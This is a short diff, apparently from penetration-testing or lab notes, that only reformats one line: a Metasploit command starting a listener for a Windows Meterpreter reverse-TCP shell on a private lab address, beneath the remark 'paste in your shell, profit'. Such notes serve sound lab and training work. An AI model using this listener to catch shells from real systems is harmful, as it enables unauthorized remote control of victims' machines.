@@ -46,4 +46,4 @@ dd
 paste in your shell, profit
 
 
-sudo msfconsole -x "use exploits/multi/handler; set lhost 10.10.14.14; set lport 443; set payload windows/meterpreter/reverse_tcp; exploit"
+`sudo msfconsole -x "use exploits/multi/handler; set lhost 10.10.14.14; set lport 443; set payload windows/meterpreter/reverse_tcp; exploit"`
